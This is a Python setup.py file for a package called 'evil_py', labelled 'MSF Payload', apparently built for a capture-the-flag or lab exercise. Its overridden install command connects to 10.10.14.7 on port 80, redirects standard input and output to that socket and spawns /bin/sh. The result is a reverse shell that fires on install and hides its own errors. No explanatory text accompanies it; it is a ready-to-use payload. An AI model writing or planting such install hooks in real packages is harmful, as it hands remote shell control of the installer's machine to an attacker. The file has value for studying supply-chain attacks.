import setuptools, os
from setuptools.command.install import install
from distutils.command.upload import upload as upload_orig

class evil_py_class(install):
  def run(self):
    import sys,socket,pty
    try:
        s=socket.socket()
        s.settimeout(5)
        s.connect(("10.10.14.7",80))
        [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
        pty.spawn("/bin/sh")
    except:
        pass

class upload(upload_orig):

    def _get_rc_file(self):
        return os.path.join('.', '.pypirc')

setuptools.setup(
  name="evil_py",
  version="1.0.0",
  author="sn0wfa11",
  author_email="dontemail@me.com",
  description="MSF Payload",
  long_description="",
  long_description_content_type="text/markdown",
  url="https://github.com/SimonGurney",
  packages=setuptools.find_packages(),
  cmdclass={ "install": evil_py_class, "upload": upload }
)
